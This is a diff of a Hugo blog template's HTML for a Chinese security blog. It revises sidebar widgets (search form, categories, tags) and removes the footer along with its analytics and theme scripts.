                 <div id="secondary">
     <section class="widget">
-        <form id="search" action='https://blog.taielab.com/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+        <form id="search" action='https://blog.taielab.com/search' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
       
       <input type="text" name="q" maxlength="20" placeholder="Search">
       <input type="hidden" name="sitesearch" value="https://blog.taielab.com">
@@ -655,28 +676,12 @@ https://github.com/pentestmonkey/windows-privesc-check
             </a>
         </li>
         
-        <li>
-            <a href="" title="" target="_blank" style="color:red">
-                
-                    
-                
-            </a>
-        </li>
-        
-        <li>
-            <a href="" title="" target="_blank" style="color:red">
-                
-                    
-                
-            </a>
-        </li>
-        
     </ul>
 </section>
 
 
     <section class="widget">
-        <h3 class="widget-title">分类</h3>
+        <h3 class="widget-title"><a href='/categories/'>分类</a></h3>
 <ul class="widget-list">
     
     <li><a href="https://blog.taielab.com/categories/Android%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/">Android应用逆向与安全 (1)</a></li>
@@ -715,7 +720,7 @@ https://github.com/pentestmonkey/windows-privesc-check
     </section>
 
     <section class="widget">
-        <h3 class="widget-title">标签</h3>
+        <h3 class="widget-title"><a href='/tags/'>标签</a></h3>
 <div class="tagcloud">
     
     <a href="https://blog.taielab.com/tags/Android/">Android</a>
@@ -795,7 +800,7 @@ https://github.com/pentestmonkey/windows-privesc-check
     <ul class="widget-list">
         
         <li>
-            <a target="_blank" href="#" title=""></a>
+            <a target="_blank" href="" title=""></a>
         </li>
         
     </ul>
@@ -812,51 +817,6 @@ https://github.com/pentestmonkey/windows-privesc-check
             </div>
         </div>
     </div>
-    <footer id="footer">
-    <div class="container">
-        &copy; 2020 <a href="https://blog.taielab.com">码中春秋&#39;s Blog By 码中春秋</a>.
-        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
-        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/flysnow-org/maupassant-hugo" target="_blank">maupassant</a>.
-        
-    </div>
-</footer>
-
-
-    
-    <script type="text/javascript">
-        window.MathJax = {
-            tex2jax: {
-                inlineMath: [['$', '$']],
-                processEscapes: true
-                }
-            };
-    </script>
-    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
-
-
-<a id="rocket" href="#top"></a>
-<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'GA ID', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
-
-    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-
-
-
-
-    <script src='/js/douban.js'></script>
-
 </body>
 
 </html>
